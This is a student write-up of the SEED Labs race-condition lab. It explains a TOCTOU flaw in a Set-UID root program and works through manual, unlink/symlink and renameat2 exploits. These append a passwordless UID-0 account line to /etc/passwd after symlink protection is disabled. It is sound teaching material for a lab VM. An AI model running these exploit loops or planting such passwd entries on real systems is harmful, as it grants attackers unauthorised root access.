# Race Condition Attack Lab — Report

SEED Labs (Ubuntu 20.04): <https://seedsecuritylabs.org/Labs_20.04/Software/Race_Condition/>

> **About the username placeholders.** The lab asks you to use variations of
> your own name. This report uses the pattern derived from your account
> (`pjoseph`). Wherever you see `firstname` below, replace it with your actual
> first name before you run the step in your VM:
>
> | Task | Format required | Example in this report |
> |------|-----------------|------------------------|
> | Task 1  | first name + first initial of last name | `firstnamej` |
> | Task 2A | first initial + last name               | `pjoseph`    |
> | Task 2B / 2C | first name + last name             | `firstnamejoseph` |

> **Where the privileged steps run.** Every `sudo`, every `chmod 4755`, and
> every change to `/etc/passwd` must be done **inside your SEED Ubuntu 20.04
> VM** — not on any shared machine. This repository holds the source code,
> the exact commands, and this write-up. The **screenshots** called for by
> the assignment are produced by running these steps in your own VM; each
> screenshot box below says precisely what the grader expects to see.

---

## Part 1 — Overview (summary)

A **race condition** happens when the correctness of a program depends on the
timing/ordering of events that an attacker can influence. The classic flavour
exploited here is **TOCTOU — Time Of Check To Time Of Use**.

The vulnerable program `vulp` is a **Set-UID root** program. It wants to behave
politely: before appending the user's input to `/tmp/XYZ` it *checks*, with
`access()`, whether the **real** user (not root) is allowed to write there:

```c
if (!access(fn, W_OK)) {   /* CHECK — uses the REAL uid */
    fp = fopen(fn, "a+");  /* USE   — opens as the EFFECTIVE uid = root */
    ...
}
```

`access()` tests the **real** UID's permission; `fopen()` runs with the
**effective** UID, which is root. The check and the use refer to the file by
**name** (`/tmp/XYZ`), not by a fixed object. If an attacker can make
`/tmp/XYZ` mean one thing at check time (a file they own, e.g. `/dev/null`) and
a different thing at use time (`/etc/passwd`), then root will dutifully write
attacker-controlled data into `/etc/passwd`. That lets the attacker add a
root-privileged account.

The lab shows three escalating techniques:
- **2A** — artificially widen the window with `sleep()` and win the race by hand.
- **2B** — remove the sleep and win the real (tiny) window with an automated
  `unlink()` + `symlink()` attack loop.
- **2C** — make the attack atomic with `renameat2(RENAME_EXCHANGE)` so it wins
  far more reliably.

---

## Part 2 — Environment Setup

The SEED VM ships the needed tooling (`gcc`, `nano`). Two kernel protections
that SEED added specifically to blunt this attack must be turned off for the
lab, exactly as the manual instructs:

```bash
# Allow a process to follow symlinks in sticky world-writable dirs like /tmp
sudo sysctl -w fs.protected_symlinks=0

# (Ubuntu also ships an unprivileged-user namespace / link protection; the
#  line above is the one the Race Condition lab requires. Re-enable with
#  fs.protected_symlinks=1 when you are done — see Part 5, which is optional.)
```

> **Screenshot (setup):** terminal showing the `sysctl -w fs.protected_symlinks=0`
> command returning `fs.protected_symlinks = 0`.

VM / lab-setup references:
- Lab setup files: <https://seedsecuritylabs.org/labsetup.html>
- SEED VM manual: <https://github.com/seed-labs/seed-labs/blob/master/manuals/vm/seedvm-manual.md>

---

## Part 3 — Choosing Our Target

### Task 1 — Edit `/etc/passwd` directly with `sudo`

This task simply demonstrates **what a successful attack will ultimately
achieve**, by doing it the easy (authorized) way first, so you understand the
target format.

A `/etc/passwd` entry has 7 colon-separated fields:

```
username : password : UID : GID : GECOS : home_dir : shell
```

An **empty second field** means *log in with no password*. **UID 0** means root
privileges.

Steps (in the VM):

```bash
sudo nano /etc/passwd
```

Add this line at the end (replace `firstname` with your first name):

```
firstnamej::0:0:test:/root:/bin/bash
```

Save (`Ctrl+O`, `Enter`) and exit (`Ctrl+X`). Verify:

```bash
tail -n 3 /etc/passwd
su firstnamej      # should give a root shell with NO password prompt
id                 # should show uid=0(root)
```

> **Screenshot (Task 1):** the tail of `/etc/passwd` showing your
> `firstnamej::0:0:...` line (and, ideally, `su firstnamej` landing in a root
> shell without asking for a password).

**Clean up before Part 4** so the race-condition result is unambiguous:

```bash
sudo nano /etc/passwd   # delete the firstnamej line you just added
```

---

## Part 4 — Launching the Race Condition Attack

All commands below run from the `race-condition-lab/` directory **inside the VM**.

### Common build/install recipe for `vulp`

```bash
gcc vulp.c -o vulp          # compile
sudo chown root vulp        # make root the owner
sudo chmod 4755 vulp        # turn ON the Set-UID bit (the leading 4) + rwxr-xr-x
ls -l vulp                  # confirm: -rwsr-xr-x  1 root ...   (the 's' is Set-UID)
```

> **Why `chown root` + `chmod 4755` matters:** see the answer to the third
> question at the end of this report. In short, without `chown root` the program
> runs as *you*, and without the Set-UID bit (`4`) the effective UID never
> becomes root — so writing to `/etc/passwd` would just fail and there would be
> nothing to exploit. **The attack does not work if you skip these.**

---

### Task 2A — Manual attack with a 10-second window

1. **Create the initial symlink** pointing the bait at a file you can write:

   ```bash
   ln -sf /dev/null /tmp/XYZ
   ```

2. **Edit `vulp.c`** so it sleeps between the `access()` check and the `fopen()`
   use. In this repo `vulp.c` already contains `sleep(10);` in that exact spot
   (use `sleep(20);` if you want more time). Keep it for 2A.

3. **Compile and install as Set-UID root** (the common recipe above):

   ```bash
   gcc vulp.c -o vulp
   sudo chown root vulp
   sudo chmod 4755 vulp
   ```

4. **Run the attack by hand, across two terminals:**

   **Terminal 1** — start `vulp` and give it the malicious line as input
   (replace `firstname`; for 2A the required format is first-initial + last
   name, i.e. `pjoseph`):

   ```bash
   ./vulp
   pjoseph::0:0:test:/root:/bin/bash
   ```

   `vulp` checks `access("/tmp/XYZ")` — which passes, because `/tmp/XYZ` →
   `/dev/null` and you own that symlink — then goes to sleep for 10 seconds.

   **Terminal 2** — *during that sleep*, re-point the symlink at the real target:

   ```bash
   ln -sf /etc/passwd /tmp/XYZ
   ```

   When `vulp` wakes up, its `fopen("/tmp/XYZ","a+")` now opens `/etc/passwd`
   **as root** and appends your line.

> **Screenshot (Task 2A — two windows):** both terminals side by side — the
> `./vulp` run with your `pjoseph::0:0:...` input in one, and the
> `ln -sf /etc/passwd /tmp/XYZ` re-point in the other, during the sleep.

5. **Verify the result:**

   ```bash
   tail -n 3 /etc/passwd
   ```

> **Screenshot (Task 2A — result):** `/etc/passwd` now ending with your
> `pjoseph::0:0:test:/root:/bin/bash` line.

**Clean up** before the next task: `sudo nano /etc/passwd` and delete the line.

---

### Task 2B — Automated attack (`unlink` + `symlink`)

1. **Edit `vulp.c` and remove the `sleep()`** (delete the `sleep(10);` line, or
   set it to `sleep(0);`). The window is now genuinely tiny.

2. **The attack program** is `attack_unlink_symlink.c` in this repo. Its loop:

   ```c
   while (1) {
       unlink("/tmp/XYZ"); symlink("/dev/null",   "/tmp/XYZ"); usleep(1000);
       unlink("/tmp/XYZ"); symlink("/etc/passwd", "/tmp/XYZ"); usleep(1000);
   }
   ```

   Compile it:

   ```bash
   gcc attack_unlink_symlink.c -o attack_unlink_symlink
   ```

> **Screenshot (Task 2B — attack program):** the contents of
> `attack_unlink_symlink.c` (e.g. `cat attack_unlink_symlink.c`).

3. **Compile `vulp` and install it Set-UID root:**

   ```bash
   gcc vulp.c -o vulp
   sudo chown root vulp
   sudo chmod 4755 vulp
   ```

4. **The driver script** is `target_process.sh` in this repo; it runs `vulp`
   in a loop until `/etc/passwd` changes, feeding it `passwd_input`.
   For 2B, `passwd_input` should contain your **first + last name** line
   (replace `firstname`): `firstnamejoseph::0:0:test:/root:/bin/bash`.

   ```bash
   chmod +x target_process.sh
   ```

> **Screenshot (Task 2B — script):** the contents of `target_process.sh`
> (and `passwd_input`).

5. **Run it — two terminals:**

   **Terminal 1** (the victim loop):

   ```bash
   ./target_process.sh
   ```

   **Terminal 2** (the attacker):

   ```bash
   ./attack_unlink_symlink
   ```

   Wait. When `vulp` finally wins the race, Terminal 1 prints
   `STOP... The /etc/passwd file has been changed`. Stop the attacker
   (`Ctrl+C`).

> **Screenshot (Task 2B — run):** both terminals — the driver loop reaching the
> "STOP..." message and the attack program running.

Verify + clean up as before (`tail -n 3 /etc/passwd`, then remove the line).

---

### Task 2C — Atomic attack (`renameat2` with `RENAME_EXCHANGE`)

1. **The improved attack program** is `attack_renameat2.c` in this repo. Instead
   of `unlink`+`symlink` (which briefly leaves `/tmp/XYZ` missing), it
   pre-creates **two** symlinks and swaps them **atomically**:

   ```c
   symlink("/dev/null",   "/tmp/XYZ");
   symlink("/etc/passwd", "/tmp/ABC");
   while (1)
       syscall(SYS_renameat2, AT_FDCWD, "/tmp/XYZ",
                               AT_FDCWD, "/tmp/ABC", RENAME_EXCHANGE);
   ```

   Because the exchange is atomic, `/tmp/XYZ` is *always* a valid symlink, so
   `vulp` never trips over a missing file — the attack wins much faster.

   Compile it:

   ```bash
   gcc attack_renameat2.c -o attack_renameat2
   ```

> **Screenshot (Task 2C — attack program):** the contents of
> `attack_renameat2.c`.

2. **Run it — two terminals** (reuse the Set-UID `vulp` with the sleep removed,
   and `target_process.sh` from Task 2B):

   **Terminal 1:** `./target_process.sh`
   **Terminal 2:** `./attack_renameat2`

> **Screenshot (Task 2C — run):** both terminals, with the driver loop reaching
> "STOP..." (this should happen noticeably faster than in 2B).

3. **Verify:**

   ```bash
   tail -n 3 /etc/passwd
   ```

> **Screenshot (Task 2C — result):** `/etc/passwd` ending with your
> `firstnamejoseph::0:0:test:/root:/bin/bash` line.

**Clean up:** remove the added line from `/etc/passwd`.

---

## Part 5 — Countermeasures (not required)

Skipped per the assignment. (For reference, the standard countermeasures are:
drop privileges with `seteuid()` around the file operation; use `open()` with
`O_NOFOLLOW`; operate on a file descriptor and `fstat()` it rather than
re-resolving a path name; and re-enable `fs.protected_symlinks=1`.)

---

## Answers to the Questions

### 1. In Task 2A, why did we ask the program to sleep for 10 seconds between the two commands?

The vulnerability lives in the gap between the **check** (`access()`) and the
**use** (`fopen()`). To exploit it, the attacker must change what `/tmp/XYZ`
points to *after* the check but *before* the use. In the real program that gap
is microscopic — far too short for a human to react to. Inserting `sleep(10)`
**artificially widens the race window** to ten full seconds, which is long
enough to switch the symlink *by hand* in a second terminal. It is purely a
teaching device: it lets us observe and perform the exact race, one step at a
time, before we automate it in Tasks 2B/2C where the sleep is removed and the
true (tiny) window must be won by a fast loop instead.

### 2. In Task 2B and 2C, why did we need to run the program multiple times to have the attack succeed?

Because winning the race is **probabilistic**, not guaranteed on any single run.
With the sleep removed, the window between `access()` and `fopen()` is only a few
microseconds, and we have no way to know when the kernel will schedule `vulp`
versus our attack loop. For the attack to work, a very specific interleaving
must occur: `/tmp/XYZ` must point at `/dev/null` at the instant `access()` runs,
**and** must point at `/etc/passwd` at the instant `fopen()` runs. Most
iterations miss this alignment — the check and use land on the same target, or
(in 2B specifically) the attacker caught `/tmp/XYZ` in its brief non-existent
state between `unlink` and `symlink`, so `vulp` just fails that round. By running
`vulp` over and over in a loop (via `target_process.sh`) while the attacker
flips the link thousands of times a second, we keep rolling the dice until one
run happens to hit the winning interleaving. (Task 2C needs **fewer** tries than
2B precisely because its atomic `renameat2` swap eliminates the self-inflicted
"link temporarily missing" failures, so a larger fraction of attempts are
genuine chances to win.)

### 3. Why did we have to change the owner and the permissions of `vulp`? (setuid bit)

Because the entire attack depends on `vulp` running with **root's effective
privileges**, and that only happens when the file is **owned by root** *and* has
the **Set-UID bit** set.

- `sudo chown root vulp` makes **root the owner** of the file. The Set-UID bit
  grants the *owner's* identity to whoever runs the program, so the owner must
  be root for running it to confer root.
- `sudo chmod 4755 vulp` sets the permissions to `rwsr-xr-x`. The leading **4**
  is the **Set-UID bit** (shown as the `s` in `-rwsr-xr-x`). When a Set-UID
  program starts, the kernel sets the process's **effective UID** to the file's
  **owner** (root), while the **real UID** stays as the invoking (normal) user.

That split is the whole point of the exploit: `access()` checks the **real UID**
(so the lowly user "passes" the permission test on the `/dev/null` bait), but
`fopen()` acts with the **effective UID = root** (so the actual write lands in
`/etc/passwd`, which only root may modify). If we skipped `chown root`, the
effective UID would just be our normal user and the write to `/etc/passwd` would
be denied. If we skipped the Set-UID bit (`chmod 4755`), the program would run
with our own UID and again have no power to touch `/etc/passwd`. In both cases
there would be no privilege to abuse and therefore no vulnerability to exploit —
which is exactly why the lab stresses that *it won't work if you don't do this.*
(Set-UID details are in the Module 5 material / the course textbook.)
